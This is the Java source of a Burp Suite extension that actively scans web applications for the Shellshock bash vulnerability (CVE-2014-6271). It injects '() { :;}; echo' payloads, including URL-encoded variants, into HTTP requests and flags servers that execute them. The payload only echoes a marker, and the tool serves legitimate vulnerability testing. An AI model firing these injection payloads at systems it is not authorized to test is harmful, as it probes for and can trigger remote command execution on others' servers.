package burp;

import java.nio.ByteBuffer;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

import com.accuvantlabs.burp.ShellshockScanIssue;

public class BurpExtender implements IBurpExtender, IScannerCheck {
	private static final String NAME = "Shellshock Scanner";

	private List<byte[]> payloadBytes;
	private String key;

	private IBurpExtenderCallbacks callbacks;
	private IExtensionHelpers helpers;

	@Override
	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
		// keep a reference to our callbacks object
		this.callbacks = callbacks;

		// obtain an extension helpers object
		helpers = callbacks.getHelpers();

		// set our extension name
		callbacks.setExtensionName(NAME);

		// Builds our payloads
		buildPayloads();
				
		// register ourselves as a custom scanner check
		callbacks.registerScannerCheck(this);
	}

	private void buildPayloads() {

		try {
			MessageDigest md5 = MessageDigest.getInstance("MD5");
			md5.update(ByteBuffer.allocate(8)
					.putLong(System.currentTimeMillis()).array());
			byte[] array = md5.digest();
			StringBuffer sb = new StringBuffer();
			for (int i = 0; i < array.length; ++i) {
				sb.append(Integer.toHexString((array[i] & 0xFF) | 0x100)
						.substring(1, 3));
			}
			this.key = sb.toString();

		} catch (NoSuchAlgorithmException e) {
			this.key = "burpshellshockaaaa";
		}

		
		// Insert $() into the key so we don't count reflections, only executions
		int keyhalf = this.key.length()/2;
		String fpkey = this.key.substring(0, keyhalf) + "$()" + this.key.substring(keyhalf, this.key.length());

		// http://en.wikipedia.org/wiki/Shellshock_(software_bug)
		String[] payloads = new String[]{
				//CVE-2014-6271
				"() { :;}; echo \"" + fpkey + "\"",  
		};
		String[] trailing = new String[]{"","&",";","&;",";&"};
		this.payloadBytes = new ArrayList<byte[]>() {
			{
				for(String p : payloads) {
					for(String t: trailing) {
						this.add((p + t).getBytes());
						this.add(helpers.urlEncode(p + t).getBytes());
					}
				}
			}
		};
		
		//System.out.println("Payload: "  + payload);
	}

	// helper method to search a response for occurrences of a literal match string
    // and return a list of start/end offsets
    private List<int[]> getMatches(byte[] response, byte[] match)
    {
        List<int[]> matches = new ArrayList<int[]>();

        int start = 0;
        while (start < response.length)
        {
            start = helpers.indexOf(response, match, true, start, response.length);
            if (start == -1)
                break;
            matches.add(new int[] { start, start + match.length });
            start += match.length;
        }
        
        return matches;
    }

	@Override
	public List<IScanIssue> doPassiveScan(
			IHttpRequestResponse baseRequestResponse) {
		// Let's not passively RCE people
		return null;
	}

	@Override
	public List<IScanIssue> doActiveScan(
			IHttpRequestResponse baseRequestResponse,
			IScannerInsertionPoint insertionPoint) {
		// TODO Auto-generated method stub
		List<IScanIssue> issues = new ArrayList<>(this.payloadBytes.size());
		
		byte[] test =  key.getBytes();
		for(byte[] payload : payloadBytes) 
		{
			byte[] checkRequest = insertionPoint.buildRequest(payload);
			
			 IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
		                baseRequestResponse.getHttpService(), checkRequest);
			 
			 // look for matches of our active check grep string
		        List<int[]> matches = getMatches(checkRequestResponse.getResponse(), test); 
		        if (matches.size() > 0)
		        {
		            // get the offsets of the payload within the request, for in-UI highlighting
		            List<int[]> requestHighlights = new ArrayList<>(1);
		            requestHighlights.add(insertionPoint.getPayloadOffsets(test));

		            // report the issue
		            
		            issues.add(new ShellshockScanIssue(
		                    baseRequestResponse.getHttpService(),
		                    helpers.analyzeRequest(baseRequestResponse).getUrl(), 
		                    new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestHighlights, matches) }, 
		                    "Shellshock",
		                    "Executing " + helpers.bytesToString(payload) + " returned a positive for shellshock. See http://en.wikipedia.org/wiki/Shellshock_(software_bug) for details.",
		                    "High"));
		            break; // One is enough
		        }
		}
		
		return (issues.size() > 0) ? issues : null ;
	}

	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue,
			IScanIssue newIssue) {
		if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            return -1;
        else return 0;
	}

}
